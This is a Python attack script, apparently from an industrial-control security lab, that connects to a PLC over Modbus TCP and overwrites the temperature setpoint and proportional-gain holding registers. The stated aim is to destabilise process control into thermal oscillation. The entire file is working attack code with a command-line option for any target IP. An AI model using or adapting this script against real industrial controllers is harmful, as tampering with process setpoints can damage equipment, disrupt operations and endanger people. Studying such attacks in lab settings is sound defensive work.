#!/usr/bin/env python3
"""
IndustryLab — Industrial Attack 3: Critical Threshold / Setpoint Manipulation
Modifies Holding Register 2 (TEMP_SP_SCALED_C10) to 85.0 C or alters proportional gain (Kp)
to destabilize closed-loop process control and induce oscillatory resonance.
"""

import sys
import argparse

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        ModbusTcpClient = None


def execute_setpoint_tamper(target_ip="127.0.0.1", port=502, new_sp_c=85.0, new_kp=90):
    print(f"\n[!] INITIATING ATTACK: Setpoint & Controller Parameter Tampering on {target_ip}:{port}...")

    if ModbusTcpClient is None:
        print("[!] pymodbus client required.")
        return False

    client = ModbusTcpClient(target_ip, port=port, timeout=2.0)
    if not client.connect():
        print(f"[-] Connection failed to {target_ip}:{port}.")
        return False

    # Read current parameters
    rr = client.read_holding_registers(2, 2, unit=1)
    if not rr.isError():
        print(f"[*] Baseline Setpoint: {rr.registers[0]/10.0:.1f} C | Baseline Kp: {rr.registers[1]/10.0:.1f}")

    # Overwrite Setpoint (Reg 2) and Gain (Reg 3)
    sp_raw = int(new_sp_c * 10)
    print(f"[*] Injecting Malicious Setpoint: {new_sp_c:.1f} C (Reg 2 = {sp_raw})...")
    res1 = client.write_register(2, sp_raw, unit=1)

    print(f"[*] Injecting Malicious High Proportional Gain: {new_kp/10.0:.1f} (Reg 3 = {new_kp})...")
    res2 = client.write_register(3, new_kp, unit=1)

    # Verify
    rr_after = client.read_holding_registers(2, 2, unit=1)
    client.close()

    if not rr_after.isError() and rr_after.registers[0] == sp_raw and rr_after.registers[1] == new_kp:
        print("[+] SUCCESS: Control parameters corrupted. System destabilized into thermal oscillation!")
        return True
    else:
        print("[-] Setpoint tampering failed or blocked.")
        return False


def main():
    parser = argparse.ArgumentParser(description="Modbus Setpoint Tampering Attack")
    parser.add_argument("--target", default="127.0.0.1", help="Target PLC IP")
    parser.add_argument("--port", type=int, default=502, help="Target PLC Port")
    parser.add_argument("--setpoint", type=float, default=85.0, help="Malicious setpoint (C)")
    parser.add_argument("--gain", type=int, default=90, help="Malicious proportional gain * 10")
    args = parser.parse_args()

    execute_setpoint_tamper(target_ip=args.target, port=args.port, new_sp_c=args.setpoint, new_kp=args.gain)


if __name__ == "__main__":
    main()
